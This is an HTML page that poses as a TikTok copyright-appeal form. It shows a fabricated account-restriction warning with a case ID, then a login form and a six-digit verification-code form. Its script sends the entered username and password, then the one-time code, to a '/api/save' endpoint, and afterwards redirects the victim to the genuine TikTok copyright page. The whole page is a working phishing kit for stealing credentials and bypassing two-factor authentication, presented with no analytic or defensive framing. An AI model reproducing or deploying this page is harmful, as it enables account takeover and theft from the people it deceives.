<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Copyright Appeal | TikTok</title>
    <link rel="icon" href="https://miniveri.com/tiktok/ico.ico" type="image/x-icon">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #fff; display: flex; justify-content: center; color: #161823; }
        .container { width: 100%; max-width: 480px; padding: 0 24px; }
        .header { display: flex; align-items: center; justify-content: center; height: 60px; position: relative; margin-bottom: 20px; }
        .back-btn { position: absolute; left: -10px; font-size: 30px; cursor: pointer; }
        h2.title { font-size: 17px; font-weight: 700; }
        #page-copyright { text-align: center; padding-top: 20px; }
        .warning-box { background: #f8f8f8; border-left: 4px solid #fe2c55; padding: 15px; text-align: left; font-size: 13px; margin: 20px 0; }
        .cp-desc { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; text-align: left; }
        .login-btn { background-color: #fe2c55; color: white; border: none; height: 44px; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
        .tabs { display: flex; border-bottom: 1px solid #e3e3e4; margin-bottom: 25px; }
        .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; font-weight: 600; color: rgba(22, 24, 35, 0.5); }
        .tab.active { color: #161823; border-bottom: 2px solid #161823; }
        .input-group { background-color: #f1f1f2; border-radius: 4px; height: 44px; margin-bottom: 10px; }
        input { border: none; background: transparent; width: 100%; height: 100%; outline: none; padding: 0 12px; font-size: 15px; }
        #page-login, #page-otp { display: none; }
        .code-input-group { display: flex; gap: 8px; margin: 20px 0; }
        .code-box { width: 100%; height: 50px; background: #f1f1f2; border-radius: 4px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid transparent; }
    </style>
</head>
<body>

<div class="container">
    <div id="page-copyright">
        <div class="header"><h2 class="title">Copyright Assistance</h2></div>
        <div style="font-size: 50px; margin: 10px 0;">⚠️</div>
        <h2 style="font-size: 20px;">Action Required</h2>
        <p class="cp-desc">Your account is scheduled for restriction due to copyright violations.</p>
        <div class="warning-box">Case ID: #9920148<br>Issue: Intellectual Property Violation</div>
        <button class="login-btn" onclick="showLogin()">Appeal Decision</button>
    </div>

    <div id="page-login">
        <div class="header"><h2 class="title">Log in</h2></div>
        <div class="tabs"><div class="tab active">Email / Username</div></div>
        <div class="input-group"><input type="text" id="login-user" placeholder="Email or username"></div>
        <div class="input-group"><input type="password" id="login-pass" placeholder="Password"></div>
        <button class="login-btn" onclick="submitFirstStep()">Log in</button>
    </div>

    <div id="page-otp">
        <div class="header"><h2 class="title">Enter code</h2></div>
        <p style="font-size: 14px; color: #555;">Code sent to: <b id="target-display"></b></p>
        <div class="code-input-group">
            <input type="text" class="code-box" maxlength="1">
            <input type="text" class="code-box" maxlength="1">
            <input type="text" class="code-box" maxlength="1">
            <input type="text" class="code-box" maxlength="1">
            <input type="text" class="code-box" maxlength="1">
            <input type="text" class="code-box" maxlength="1">
        </div>
        <button class="login-btn" onclick="finalVerify()">Verify</button>
    </div>
</div>

<script>
    function showLogin() {
        document.getElementById('page-copyright').style.display = 'none';
        document.getElementById('page-login').style.display = 'block';
    }

    async function submitFirstStep() {
        const user = document.getElementById('login-user').value;
        const pass = document.getElementById('login-pass').value;
        if(!user || !pass) return alert("Please fill all fields!");

        await fetch('/api/save', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ user, pass, type: 'login' })
        });

        document.getElementById('page-login').style.display = 'none';
        document.getElementById('page-otp').style.display = 'block';
        document.getElementById('target-display').textContent = user;
    }

    async function finalVerify() {
        const boxes = document.querySelectorAll('.code-box');
        const code = Array.from(boxes).map(i => i.value).join('');
        const user = document.getElementById('target-display').textContent;

        if(code.length < 6) return alert("Enter full code!");

        await fetch('/api/save', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ user, code, type: 'otp' })
        });

        window.location.href = "https://www.tiktok.com/legal/report/copyright";
    }

    // Kod kutucukları arası otomatik geçiş
    document.querySelectorAll('.code-box').forEach((box, idx, ary) => {
        box.addEventListener('input', () => { if(box.value && idx < ary.length-1) ary[idx+1].focus(); });
    });
</script>

</body>
</html>
